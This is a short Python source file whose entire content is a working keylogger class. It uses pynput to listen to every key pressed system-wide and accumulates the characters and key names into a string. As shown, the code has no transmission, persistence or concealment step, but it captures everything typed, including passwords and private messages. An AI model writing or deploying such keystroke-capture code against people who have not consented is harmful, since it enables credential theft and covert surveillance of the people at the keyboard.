from pynput import keyboard

class KeyLogger:
    def __init__(self):
        self.logger = ""
        self.key_logger_service()


    def key_logger_service(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

    def on_press(self, key):
        try:
            self.logger += key.char
        except AttributeError:
            self.logger += str(key)